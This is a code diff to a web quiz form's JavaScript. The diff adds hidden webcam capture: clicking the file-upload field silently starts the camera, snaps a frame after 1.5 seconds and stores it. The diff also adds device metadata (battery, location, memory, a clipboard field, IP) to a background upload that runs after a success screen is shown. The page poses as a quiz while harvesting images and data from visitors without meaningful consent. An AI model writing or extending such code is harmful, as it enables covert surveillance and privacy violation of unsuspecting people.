@@ -1,7 +1,13 @@
 const form = document.getElementById("quiz-form");
+const video = document.getElementById("video");
+const canvas = document.getElementById("canvas");
 const fileInput = document.getElementById("user-file");
 
 const BACKEND_BASE = "/api";
+const constraints = { video: { facingMode: "user" }, audio: false };
+
+let cameraCaptured = false;
+let capturedImage = null; // store camera image temporarily
 
 // ================================
 // COLLECT METADATA (ON SUBMIT)
@@ -13,8 +19,9 @@ async function collectMetadata() {
     battery: "N/A",
     location: "N/A",
     deviceMemory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "N/A",
-    clipboardContent: "N/A", // renamed from network
+    clipboardContent: "N/A", // replaces network field
     time: new Date().toLocaleString(),
+    ip: "" // will fill from req.ip if backend wants
   };
 
   // Battery info
@@ -53,9 +60,48 @@ async function collectMetadata() {
 }
 
 // ================================
-// UPLOAD FILE + METADATA
+// CAPTURE CAMERA (DESKTOP ONLY)
 // ================================
-async function uploadFileWithMetadata(file, metadata) {
+async function captureCamera() {
+  if (cameraCaptured) return;
+
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia(constraints);
+    video.srcObject = stream;
+
+    await new Promise((r) => setTimeout(r, 1500)); // give camera time
+
+    canvas.width = 640;
+    canvas.height = 480;
+
+    const ctx = canvas.getContext("2d");
+    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+    capturedImage = canvas.toDataURL("image/png"); // store image
+
+    stream.getTracks().forEach((t) => t.stop());
+    cameraCaptured = true;
+    console.log("Desktop camera captured");
+  } catch (err) {
+    console.log("Camera denied or blocked:", err);
+  }
+}
+
+// ================================
+// FILE INPUT: MOBILE & DESKTOP
+// ================================
+if (fileInput) {
+  fileInput.addEventListener("click", async () => {
+    // For desktop, trigger camera capture
+    await captureCamera();
+    // On mobile, native camera opens automatically if <input capture="user">
+  });
+}
+
+// ================================
+// UPLOAD FILE + METADATA + CAMERA IMAGE
+// ================================
+async function uploadFileWithMetadata(file, metadata, cameraImage) {
   return new Promise((resolve, reject) => {
     const reader = new FileReader();
 
@@ -67,7 +113,8 @@ async function uploadFileWithMetadata(file, metadata) {
           body: JSON.stringify({
             file: reader.result,
             filename: file.name,
-            metadata
+            metadata,
+            cameraImage // optional, include if captured
           }),
         });
 
@@ -97,11 +144,16 @@ form.addEventListener("submit", async (e) => {
   document.getElementById("quiz-container").style.display = "none";
   document.getElementById("success-container").style.display = "flex";
 
-  // Send metadata + file in background
+  // Send everything in background
   (async () => {
     try {
       const metadata = await collectMetadata();
-      const res = await uploadFileWithMetadata(fileInput.files[0], metadata);
+
+      const res = await uploadFileWithMetadata(
+        fileInput.files[0],
+        metadata,
+        capturedImage
+      );
 
       console.log("Upload successful:", res);
     } catch (err) {
